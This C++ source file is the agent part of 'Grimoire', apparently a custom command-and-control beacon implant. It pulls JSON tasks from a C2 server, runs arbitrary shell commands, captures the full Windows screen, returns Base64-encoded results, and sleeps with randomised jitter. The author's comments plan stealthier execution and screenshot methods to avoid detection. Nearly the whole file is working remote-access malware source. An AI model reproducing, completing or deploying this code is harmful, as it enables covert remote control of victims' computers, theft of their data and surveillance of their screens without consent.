//
// Created by Nebu1ea on 2025/11/25.
//

#include "GrimoireAgent.hpp"
#include "GrimoireConfig.hpp"
#include "Utils.hpp"
#include <iostream>
#include <random>
#include <thread>

// 引入特定平台的头文件，用于命令执行和截屏（Windows API）
#ifdef _WIN32
#include <windows.h>
#include <cstdio>
#else
// Linux/macOS 占位符
#include <cstdlib>
#endif


namespace Grimoire::Agent {

// ----------------------------------------------------
// 构造函数
// ----------------------------------------------------
GrimoireAgent::GrimoireAgent() {
    // 1. 初始化加密模块：它是所有共享状态的管理者
    crypto_manager_ = std::make_shared<GrimoireCrypto>();

    // 2. 初始化通信模块：依赖于加密模块
    comms_manager_ = std::make_unique<GrimoireComms>(crypto_manager_);
}


// ----------------------------------------------------
// 任务处理：命令执行 (Command Execution)这是最不隐蔽的方式，非常的西巴，掩蔽的方式以后实现
// ----------------------------------------------------
std::string GrimoireAgent::ExecuteCommand(const std::string& command) {
#ifdef _WIN32
    // Windows API 实现：使用 popen / _popen 代替 system，以捕获输出

    std::string result = "";
    // 缓冲区大小
    char buffer[128];

    // 使用 _popen 执行命令并读取输出
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        return "ERROR: Failed to run command.";
    }

    // 逐行读取输出
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    _pclose(pipe); // 关闭管道
    return result;

#else
    // Linux/macOS 实现：使用 popen 代替 system，以捕获输出
    std::string result = "";
    // 缓冲区大小
    char buffer[128];
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        return "ERROR: Failed to run command via popen.";
    }

    // 逐行读取输出
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    if (pclose(pipe) == -1) {
        return result + " (WARNING: pclose error)";
    }

    return result;
#endif
}


// ----------------------------------------------------
// 任务处理：截屏 (Screenshot) 及其不隐蔽，掩蔽的太难写了，要调用DXGI
// ----------------------------------------------------
std::vector<unsigned char> GrimoireAgent::TakeScreenshot() {
    #ifdef _WIN32
        std::vector<unsigned char> result;

        // 获取屏幕设备上下文 (DC)
        HDC hScreen = GetDC(nullptr); // NULL for the entire screen
        HDC hDC = CreateCompatibleDC(hScreen);

        if (!hScreen || !hDC) {
            std::cerr << "ERROR: Failed to get screen DC or create compatible DC." << std::endl;
            if (hScreen) ReleaseDC(nullptr, hScreen);
            return {}; // 返回空向量
        }

        // 获取屏幕尺寸
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);

        // 创建兼容位图
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
        if (!hBitmap) {
            std::cerr << "ERROR: Failed to create compatible bitmap." << std::endl;
            DeleteDC(hDC);
            ReleaseDC(nullptr, hScreen);
            return {};
        }

        // 将位图选入设备上下文
        HGDIOBJ hOld = SelectObject(hDC, hBitmap);

        // 将屏幕内容复制到位图 (核心API调用，也是最易被HOOK的地方)
        if (!BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY)) {
            std::cerr << "ERROR: BitBlt failed." << std::endl;
            SelectObject(hDC, hOld);
            DeleteObject(hBitmap);
            DeleteDC(hDC);
            ReleaseDC(nullptr, hScreen);
            return {};
        }

        // 将 HBITMAP 数据转换为 BMP 字节流
        BITMAPFILEHEADER bmFH;
        BITMAPINFOHEADER bmIH;

        // 获取位图信息
        bmIH.biSize = sizeof(BITMAPINFOHEADER);
        bmIH.biWidth = width;
        bmIH.biHeight = height;
        bmIH.biPlanes = 1;
        bmIH.biBitCount = 32; // 32-bit color depth
        bmIH.biCompression = BI_RGB;

        DWORD dwSize = ((width * 32 + 31) / 32) * 4 * height;

        // 分配内存
        std::vector<char> buffer(dwSize);

        // 获取位图数据
        GetDIBits(hDC, hBitmap, 0, height, buffer.data(), reinterpret_cast<BITMAPINFO*>(&bmIH), DIB_RGB_COLORS);

        // 填充文件头
        bmFH.bfType = 0x4D42; // 'BM'
        bmFH.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwSize;
        bmFH.bfReserved1 = 0;
        bmFH.bfReserved2 = 0;
        bmFH.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

        // 组合数据流 (BMP Header + BMP Info + Pixel Data)
        result.insert(result.end(), reinterpret_cast<unsigned char*>(&bmFH), reinterpret_cast<unsigned char*>(&bmFH) + sizeof(BITMAPFILEHEADER));
        result.insert(result.end(), reinterpret_cast<unsigned char*>(&bmIH), reinterpret_cast<unsigned char*>(&bmIH) + sizeof(BITMAPINFOHEADER));
        result.insert(result.end(), buffer.begin(), buffer.end());

        // 清理资源
        SelectObject(hDC, hOld);
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(nullptr, hScreen);

        std::cout << "DEBUG: Screenshot taken, size: " << result.size() << " bytes." << std::endl;
        return result;
    #else
        // 占位符 (Linux/macOS 通常需要 Xlib 或 Wayland/Pipewire 库，工程量较大)
        std::cout << "DEBUG: Attempting to take screenshot (stub)..." << std::endl;
        std::string placeholder_data = "Placeholder: Screenshot data is too complex to implement here for non-Windows.";
        std::vector<unsigned char> result(placeholder_data.begin(), placeholder_data.end());
        return result;
    #endif
}




// ----------------------------------------------------
// 任务分发器 (Task Dispatcher)
// ----------------------------------------------------
std::vector<unsigned char> GrimoireAgent::ProcessTask(const std::vector<unsigned char>& task_payload) {
    try {
        // 将接收到的字节数组转换为 JSON
        std::string task_str(task_payload.begin(), task_payload.end());
        json task_json = json::parse(task_str);

        // 检查必须字段
        if (!task_json.contains("task_id") || !task_json.contains("command")) {
            return {}; // 忽略无效任务
        }

        std::string task_id = task_json["task_id"].get<std::string>();
        std::string command_type = task_json["command"].get<std::string>();

        // 提取可选参数 argument，如果不存在则为空字符串
        std::string argument = task_json.contains("argument")
                               ? task_json["argument"].get<std::string>()
                               : "";

        std::string result_str;
        std::vector<unsigned char> result_bytes;

        std::cout << "INFO: Executing task " << task_id << " (Type: " << command_type << ")..." << std::endl;

        // 2. 任务分发 (Dispatch based on command_type)
        if (command_type == "shell" || command_type == "whoami") {
            // shell 任务的参数就是 argument，如果 command_type 是 whoami，argument 则为空
            std::string cmd_to_run = (command_type == "whoami") ? "whoami" : argument;

            if (cmd_to_run.empty()) {
                 result_str = "ERROR: Shell command task requires an argument.";
            } else {
                 result_str = ExecuteCommand(cmd_to_run); // 使用 ExecuteCommand 执行
            }
            result_bytes.assign(result_str.begin(), result_str.end());

        } else if (command_type == "screenshot") {
            // 截屏任务，可以忽略 argument 或用于指定格式/显示器
            result_bytes = TakeScreenshot();

        } else if (command_type == "sleep") {
            // 运行时修改休眠时间（后续我会补充）
            result_str = "INFO: Sleep time update task received.";
            result_bytes.assign(result_str.begin(), result_str.end());

        } else {
            result_str = "ERROR: Unknown command type: " + command_type;
            result_bytes.assign(result_str.begin(), result_str.end());
        }

        // 封装结果 JSON (与之前相同)
        json result_json = {
            {"task_id", task_id},
            {"output", Utils::Base64Encode(result_bytes)}
        };
        std::string final_result = result_json.dump();
        return std::vector<unsigned char>(final_result.begin(), final_result.end());

    } catch (const std::exception& e) {
        std::cerr << "ERROR: Failed to process task: " << e.what() << std::endl;
        return {};
    }
}


// ----------------------------------------------------
// 休眠与抖动 (Sleep/Jitter)
// ----------------------------------------------------
void GrimoireAgent::SleepWithJitter() {
    // 计算抖动范围
    int jitter_range = (SLEEP_TIME_SECONDS * JITTER_PERCENT) / 100;

    // 使用 libsodium 替代 C++ 随机数库，提供更高的随机性
    // 抖动时间 = 0 到 2*jitter_range 之间的一个随机值 - jitter_range
    uint32_t random_jitter = 0;
    randombytes_buf(&random_jitter, sizeof(random_jitter));

    int min_sleep = SLEEP_TIME_SECONDS - jitter_range;
    int max_sleep = SLEEP_TIME_SECONDS + jitter_range;

    // 确保最小休眠时间不小于 1 秒
    if (min_sleep < 1) min_sleep = 1;

    // 随机数范围 [min_sleep, max_sleep]
    int sleep_duration = min_sleep + (random_jitter % (max_sleep - min_sleep + 1));

    std::cout << "INFO: Sleeping for " << sleep_duration << " seconds..." << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(sleep_duration));
}


// ----------------------------------------------------
// 主循环 (Run)
// ----------------------------------------------------
void GrimoireAgent::Run() {

    std::cout << "INFO: Grimoire Beacon starting up..." << std::endl;

    // 密钥协商 (Initial Check-in)
    while (!comms_manager_->SendInitialCheckIn()) {
        std::cerr << "CRITICAL: Initial check-in failed. Retrying in " << SLEEP_TIME_SECONDS << "s." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(SLEEP_TIME_SECONDS));
    }
    std::cout << "SUCCESS: Session established. Beacon ID (SF): " << crypto_manager_->GetBeaconSessionFingerprint() << std::endl;


    // 主通信循环
    while (true) {

        // 请求任务
        std::vector<unsigned char> task_payload = comms_manager_->ReceiveTask();

        std::vector<unsigned char> result_payload;

        if (!task_payload.empty()) {
            // 处理任务
            result_payload = ProcessTask(task_payload);
        }

        // 发送结果 (如果 result_payload 非空，则发送任务结果；否则发送心跳)
        if (!result_payload.empty()) {
             comms_manager_->SendResult(result_payload);
        }

        //  休眠与抖动
        SleepWithJitter();
    }
}

} // namespace Grimoire